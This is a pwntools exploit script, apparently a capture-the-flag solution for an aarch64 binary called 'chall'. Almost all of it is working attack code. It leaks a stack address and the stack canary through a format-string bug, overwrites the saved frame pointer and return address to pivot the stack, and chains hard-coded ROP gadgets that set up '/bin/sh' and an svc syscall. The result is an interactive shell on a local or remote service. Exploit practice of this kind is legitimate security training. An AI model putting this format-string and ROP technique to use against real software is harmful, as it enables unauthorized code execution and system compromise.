from pwn import *
context.arch = 'aarch64'

EXE = "./chall"
#PRINTED = 0x10
OFFSET = 15

gadget = 0x000000000044be78 # : mov sp, x29 ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret
gadget1 = 0x00000000004236d0 # : ldr x0, [sp, #0x70] ; ldp x29, x30, [sp], #0x90 ; ret
gadget3 = 0x00000000004497f4 #: ldp x8, x9, [sp], #0xd0 ; ldp x17, x30, [sp], #0x10 ; br x16
gadget5 = 0x000000000041d3f4 # : ldp x8, x9, [x1, #0x10] ; ldp x10, x11, [x4, #-0x20] ; stp x8, x9, [x0, #0x10] ; stp x10, x11, [x5, #-0x20] ; stp x6, x7, [x0] ; stp x12, x13, [x5, #-0x10] ; ret

gadget4 = 0x0000000000449944 # : ldr x8, [x29, #0x70] ; ldp q0, q1, [x29, #0x70] ; ldp q2, q3, [x29, #0x90] ; ldp q4, q5, [x29, #0xb0] ; ldp q6, q7, [x29, #0xd0] ; ldr x30, [x29, #0x1d8] ; mov sp, x29 ; ldr x29, [x29] ; add sp, sp, #0x200 ; br x30
gadget2 = 0x0000000000412d2c # : ldp x0, x1, [sp, #0x28] ; ldr x2, [sp, #0x38] ; ldr x3, [x19, #0x40] ; ldr x19, [sp, #0x10] ; mov x16, x3 ; ldp x29, x30, [sp], #0x40 ; br x16
svc = 0x0000000000414a04 # : svc #0 ; ret

_dl_make_stacks_executable = 0x44D5D0

def exec_fmt(payload):
    r = process(EXE)
    r.clean()
    r.sendline(payload)
    r.shutdown(direction="send")
    data = r.recvline()
    print(payload)
    print([data])
    r.close()
    return data

autofmt = FmtStr(exec_fmt)

#r = process(["/home/kylebot/src/qemu/build/qemu-aarch64", "-g", "1234", "./chall"])
#r = process(["./chall"])
#r = process(["qemu-aarch64-static", "-g", "1234", "./chall"])
#r = remote("172.17.0.2", 9999)
r = remote("127.0.0.1", 24042)


# leak stack addr & canary in the first printf
r.sendlineafter(":P)\n", "%142$p_%141$p")
a, b = r.recvline().strip().split(b'_')
stack_ptr = int(a, 16)
canary = int(b, 16)
log.info("stack_ptr: %#x" % stack_ptr)
target_addr = stack_ptr - 0x480
log.info("target_addr: %#x" % target_addr)
log.info("canary: %#x" % canary)

# overwrite lr and fp and pivot to the buffer
buffer = target_addr + 0x28 + 0x200 - 0xf0
log.info("buffer: %#x" % buffer)
writes = {target_addr+8: gadget, target_addr:buffer}
fmt = fmtstr_payload(OFFSET, writes, numbwritten=autofmt.padlen)
assert(len(fmt) <= 0x100)
payload = fmt.ljust(0x100, b'\x00')

sp = target_addr + 0x168
pivot_payload = p64(sp) + p64(gadget4) + p64(sp+0x200)*4
rop = []
r.sendline(payload + pivot_payload + b'/bin/sh'.ljust(0x70, b'\x00') + p64(0xdd)+b'\x00'*0x160 + 
            p64(gadget2) + p64(0)*9 + p64(sp) + p64(0) + p64(0) + p64(svc))


r.interactive()
